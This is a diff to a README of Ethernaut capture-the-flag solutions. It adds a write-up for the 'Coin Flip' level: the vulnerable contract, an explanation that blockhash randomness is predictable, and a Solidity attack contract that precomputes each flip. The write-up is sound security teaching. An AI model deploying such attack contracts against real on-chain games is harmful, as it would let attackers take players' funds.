@@ -34,6 +34,16 @@ My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.
 </ol>
 </details>
 
+<details>
+<summary>
+<a href="#03-coin-flip">03. Coin Flip</a>
+</summary>
+<ol>
+    <li><a href="./contracts/03-coin-flip/">Contracts</a></li>
+    <li><a href="./scripts/03-coin-flip.ts">Script</a></li>
+</ol>
+</details>
+
 ## 00. Hello Ethernaut
 
 This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.
@@ -341,3 +351,105 @@ This allowed the attacker to call the old constructor and claim ownership of the
 </details>
 
 <a href='./contracts/02-fallout/'>Contracts</a> | <a href='./scripts/02-fallout.ts'>Script</a>
+
+## 03. Coin Flip
+
+### Challenge
+
+This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
+
+<details>
+  <summary>Instance</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+```
+
+</details>
+
+### Solution
+
+<details>
+  <summary>Description</summary>
+
+This is a challenge to understand how randomness works on Ethereum. Since this is a deterministic environment, it is not possible to create unpredictable randomness. If you need to use random in your protocol, then it is better to use oracles ([Chainlink VRF](https://docs.chain.link/vrf)).
+
+In order to complete the challenge, we need to guess which side will fall out 10 times in a row.
+Since this is based on the hash of the previous block, it is possible to calculate in advance which side will land.
+To do this, we will write an attack contract and run it in [Remix Online](https://remix.ethereum.org/) and make 10 calls to the attack functions. Thus, we get the same `blockValue` as the instance, since we launch them in one transaction.
+
+</details>
+
+<details>
+  <summary>Attack Contract</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import './CoinFlip.sol';
+
+contract CoinFlipAttack {
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+  CoinFlip _coinFlip;
+
+  constructor(CoinFlip coinFlip) {
+    _coinFlip = coinFlip;
+  }
+
+  function attack() public {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+    _coinFlip.flip(side);
+  }
+}
+
+```
+
+</details>
+
+<details>
+  <summary>Comments From OpenZeppelin</summary>
+
+Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.
+
+To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.
+
+Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).
+
+</details>
+
+<a href='./contracts/03-coin-flip/'>Contracts</a> | <a href='./scripts/03-coin-flip.ts'>Script</a>
